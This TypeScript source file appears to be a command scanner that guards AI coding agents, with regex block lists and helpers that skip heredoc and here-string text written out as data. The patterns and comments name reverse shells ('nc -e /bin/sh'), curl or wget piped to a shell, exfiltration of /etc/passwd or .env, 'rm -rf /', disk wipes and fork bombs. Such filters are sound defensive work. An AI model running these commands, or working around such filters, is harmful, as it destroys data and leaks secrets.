export interface CommandScanResult {
  isBlocked: boolean;
  category?: 'A' | 'B' | 'C' | 'D';
  reason?: string;
}

// A heredoc's opening operator. Not `<<<`, which is a here-string.
const HEREDOC = /(?<!<)<<(-?)[ \t]*(['"]?)([A-Za-z_][\w.-]*)\2/g

// Programs that run what they are given. A heredoc whose opening line names
// one of these as a word, or pipes onward, feeds a command and stays scanned.
const RUNS_INPUT = /^(?:bash|sh|zsh|ksh|dash|fish|eval|exec|source|\.|python[\d.]*|node|deno|bun|perl|ruby|php|psql|mysql|sqlite3|sqlcmd|mongosh|redis-cli|pwsh|powershell|cmd|osascript|ssh|xargs)$/

function words(text: string): string[] {
  return text.split(/[\s|;&()`"'$<>]+/).filter(Boolean).map((w) => w.replace(/^.*\//, ''))
}

function feedsCommand(line: string): boolean {
  return line.includes('|') || words(line).some((w) => RUNS_INPUT.test(w))
}

// Programs that only store what they read: cat and tee write it out, git
// takes it as a commit message or a patch, gh as a body. None runs it.
const STORES_INPUT = new Set(['cat', 'tee', 'git', 'gh'])

const SEPARATORS = /\n|\|\|?|&&|;|\$\(|`|\(/

/** True when one simple command in `rest` runs `target`, directly or through an interpreter. */
function runsFile(rest: string, target: string): boolean {
  const name = target.replace(/^.*\//, '')
  return rest.split(SEPARATORS).some((command) => {
    const w = words(command)
    return command.includes(target.replace(/^\.\//, '')) && (w[0] === name || w.some((x) => RUNS_INPUT.test(x)))
  })
}

/**
 * Drop the body of every heredoc that is written out as data: read by a
 * program that only stores it (cat, tee, git, gh), on an opening line that
 * runs and pipes nothing, into a file no later command then runs. Replaying 47,556 real Claude
 * Code shell calls, every DROP TABLE and curl | sh match outside a real
 * command was the text of a test, a document or a commit message being
 * written this way (#285). A body fed to a shell, an interpreter or a database
 * client is still scanned, and so is every line outside a body.
 */
export function stripDataHeredocs(command: string): string {
  const lines = command.split('\n')
  const out: string[] = []
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i] ?? ''
    out.push(line)
    const opened = [...line.matchAll(HEREDOC)]
    if (opened.length !== 1) continue
    const [, dash, , delimiter] = opened[0] as RegExpExecArray
    const end = lines.findIndex((l, j) => j > i && (dash ? l.replace(/^\t+/, '') : l) === delimiter)
    if (end === -1) continue
    const before = line.slice(0, (opened[0] as RegExpExecArray).index)
    const program = words(before.split(SEPARATORS).pop() ?? '')[0] ?? ''
    if (!STORES_INPUT.has(program) || feedsCommand(line)) continue
    const targets = [
      ...[...line.matchAll(/>>?\s*(['"]?)([^\s'";&|)]+)\1/g)].map((m) => m[2] ?? ''),
      ...(program === 'tee' ? words(before.slice(before.lastIndexOf('tee') + 3)).filter((w) => !w.startsWith('-')) : []),
    ].filter((t) => t && t !== '/dev/null')
    const rest = lines.slice(end + 1).join('\n')
    if (targets.some((t) => runsFile(rest, t))) continue
    out.push(lines[end] ?? '')
    i = end
  }
  return out.join('\n')
}

// PowerShell's own ways to run text, beside the RUNS_INPUT programs.
const RUNS_TEXT = /^(?:invoke-expression|iex|invoke-command|start-process)$/i

// One quoted argument, shell-style: double quotes honour backslash escapes,
// single quotes run to the next single quote.
const QUOTED = /"(?:[^"\\]|\\.)*"|'[^']*'/g

/**
 * Blank every quoted argument that holds whitespace, unless something in the
 * call can run text: a shell, interpreter or database client among the
 * unquoted words, a pipe into one, PowerShell's Invoke-Expression, or command
 * substitution (`$(...)`, backticks, `<(...)`). A quoted argument with a space
 * in it is never a git flag or an SQL statement git or a non-client runs, so
 * `grep "git reset --hard"` and `git commit -m "... DROP TABLE ..."` are text,
 * while `git push "--force"` (one token) and `bash -c "git reset --hard"`
 * stay scanned (#298). Applied to Category D only: the A and B patterns
 * (`rm -rf ~`, `curl | sh`) keep reading the whole line.
 */
export function stripQuotedText(command: string): string {
  if (/\$\(|`|<\(/.test(command)) return command
  // A span crossing a line is left alone: it may be a here-string the call
  // runs rather than an argument.
  const blanked = command.replace(QUOTED, (q) => (/\s/.test(q) && !q.includes('\n') ? ' '.repeat(q.length) : q))
  if (words(blanked).some((w) => RUNS_INPUT.test(w) || RUNS_TEXT.test(w))) return command
  return blanked
}

// PowerShell cmdlets that only write what they are given to a file.
const WRITES_TEXT = new Set(['set-content', 'add-content', 'out-file'])

/**
 * Drop the body of every PowerShell here-string (`@'...'@`, `@"..."@`) that a
 * Set-Content, Add-Content or Out-File writes to a file no later command in
 * the call mentions. The PowerShell twin of stripDataHeredocs (#298). A
 * here-string assigned to a variable, passed to Invoke-Expression, or written
 * to a file the call then runs is still scanned.
 */
export function stripDataHereStrings(command: string): string {
  const lines = command.split('\n')
  const out: string[] = []
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i] ?? ''
    out.push(line)
    const open = /@(['"])\s*$/.exec(line)
    if (!open) continue
    const quote = open[1] ?? ''
    const end = lines.findIndex((l, j) => j > i && l.startsWith(`${quote}@`))
    if (end === -1) continue
    const before = (line.slice(0, open.index).split(';').pop() ?? '').trim()
    const close = (lines[end] ?? '').slice(2)
    const sep = close.indexOf(';')
    const tail = sep === -1 ? close : close.slice(0, sep)
    const rest = [sep === -1 ? '' : close.slice(sep + 1), ...lines.slice(end + 1)].join('\n')
    const piped = tail.trim().startsWith('|') ? tail.trim().slice(1) : ''
    const writer = before
      ? WRITES_TEXT.has((words(before)[0] ?? '').toLowerCase()) && !tail.includes('|')
      : WRITES_TEXT.has((words(piped)[0] ?? '').toLowerCase()) && !piped.includes('|')
    if (!writer) continue
    const targets = words(`${before} ${tail}`).filter((w) => !w.startsWith('-') && /[./\\]/.test(w))
    if (targets.some((t) => rest.includes(t.replace(/^.*[\\/]/, '')))) continue
    out.push(lines[end] ?? '')
    i = end
  }
  return out.join('\n')
}

export class CommandScanner {
  private categories = {
    a: {
      name: 'File System Devastation',
      patterns: [
        // Recursive delete of root / home / glob, tolerant of flag order and
        // splitting: `rm -rf /`, `rm -f -r /`, `rm --recursive --force /`,
        // `rm -rf ~`, `rm -fr *`. A relative target (`rm -rf ./build`) is left
        // alone to avoid flagging routine cleanup, and so is a deep absolute
        // path: the target used to be the class [/*~], which matched the first
        // character of ANY absolute path, so agents cleaning a scratch
        // directory (`rm -rf /c/Users/me/AppData/Local/Temp/...`) or one cached
        // artifact (`rm -rf ~/.m2/repository/...`) were refused. The target must
        // now BE root, home, a bare glob, a Git Bash drive root (/c/) or a
        // top-level system directory, optionally quoted and globbed.
        /rm\s+(?:-{1,2}[a-z]+\s+)*-{1,2}[a-z]*r[a-z]*\s+(?:-{1,2}[a-z-]+\s+)*["']?(?:\/(?:bin|boot|dev|etc|home|lib|lib64|opt|proc|root|run|sbin|srv|sys|usr|var|Users|System|Library|Applications|Windows)\/?\*?|\/[a-z]\/?\*?|\/\*?|~\/?\*?|\$\{?HOME\}?\/?\*?|\*)["']?(?=\s|$|[;&|)])/i,
        /del\s+\/s\s+\/q\s+[A-Za-z]:\\*/i,
        /mkfs\..*/i,
        // Raw-disk overwrite (disk wipe) — match writing to a block device
        // regardless of arg order, plus zero/random sources piped to any `of=`.
        /\bdd\b[^|;&\n]*\bof=\/dev\/(?:sd|nvme|hd|vd|disk|mapper)/i,
        /\bdd\b[^|;&\n]*\bif=\/dev\/(?:zero|urandom|random)\b[^|;&\n]*\bof=/i,
        /cat\s+\/dev\/null\s+>/i,
        /chmod\s+-R\s+777/i,
        // Recursive ownership change scoped to root or a glob target, so a
        // routine `chown -R user ./localdir` does NOT trip a false positive.
        /chown\s+-R[a-z]*\s+\S+\s+[/*](?:\s|$)/i,
      ],
    },
    b: {
      name: 'Reverse Shells & Network Pivots',
      patterns: [
        /curl\s+.*\|\s*(?:bash|sh|zsh|ksh|dash|fish)\b/i,
        /wget\s+.*\|\s*(?:bash|sh|zsh|ksh|dash|fish)\b/i,
        // Process substitution: `bash <(curl evil)` / `sh <(wget evil)`.
        /\b(?:bash|sh|zsh|ksh|dash)\s+<\(\s*(?:curl|wget)\b/i,
        /nc\s+-e\s+\/bin\/sh/i,
        /netcat\s+-c/i,
        /curl\s+.*(?:-d|-F|--data|--form|-X\s*POST).*(\/etc\/passwd|\.env|\.git\/config)/i,
      ],
    },
    c: {
      name: 'Process & Resource Exhaustion',
      patterns: [
        // Fork bomb of any function name, tolerant of whitespace:
        // `:(){ :|:& };:` and `: () { :|:& };:`. The backreference ties the
        // recursive calls to the function's own name.
        /([:\w]+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}\s*;\s*\1/,
        /%0\|%0/i,
        /killall\s+-9\s+.*/i,
        /pkill\s+-9\s+.*/i,
      ],
    },
    d: {
      name: 'Developer Tools & Infrastructure',
      patterns: [
        // Force push: --force and its variants, or a short flag starting with
        // f (-f, -fu), anywhere after `git push` on the line, as the old rule
        // read it. The one change is that the flag must be its own token: not
        // preceded by a letter, digit, _, /, . or -. Matching the bare
        // substring "-f" refused branch names like fix/login-form and
        // feature/add-filters, and --follow-tags. Any other character may
        // precede it (space, quote, backslash, brace), and the line is not
        // split at | ; & because those can sit inside a quoted URL or ref;
        // a narrower "one command" reading was tried and let quoted and
        // escaped force pushes through. -uf and +refspec were never matched
        // and still are not, so this only removes false positives.
        // --force-with-lease (and --force-if-includes beside it) refuses to
        // overwrite a remote ref it has not seen, so it is not matched (#285).
        /\bgit\s+push\b.*(?<![\w/.-])--force(?![\w-])/i,
        // Case-sensitive: git's short flags are, and with /i a later
        // `awk -F'\t'` on the same line read as a force push.
        /\bgit\s+push\b.*(?<![\w/.-])-f[a-z]*(?![\w-])/,
        // Any hard reset is destructive (discards working tree), not just
        // `HEAD~N`: also catches `--hard origin/main`, bare `--hard`.
        /git\s+reset\s+--hard\b/i,
        /DROP\s+DATABASE/i,
        /DROP\s+TABLE/i,
        /TRUNCATE\s+TABLE/i,
        /terraform\s+destroy/i,
        /aws\s+.*delete-.*/i,
      ],
    },
  };

  scan(command: string, enabledCategories: { a: boolean; b: boolean; c: boolean; d: boolean }): CommandScanResult {
    command = stripDataHereStrings(stripDataHeredocs(command))
    const unquoted = stripQuotedText(command)
    for (const [key, cat] of Object.entries(this.categories) as [('a' | 'b' | 'c' | 'd'), typeof this.categories['a']][]) {
      if (!enabledCategories[key]) {
        continue;
      }
      for (const pattern of cat.patterns) {
        if (pattern.test(key === 'd' ? unquoted : command)) {
          return {
            isBlocked: true,
            category: key.toUpperCase() as 'A' | 'B' | 'C' | 'D',
            reason: `Triggered Category ${key.toUpperCase()} (${cat.name}) rule.`,
          };
        }
      }
    }
    return { isBlocked: false };
  }
}
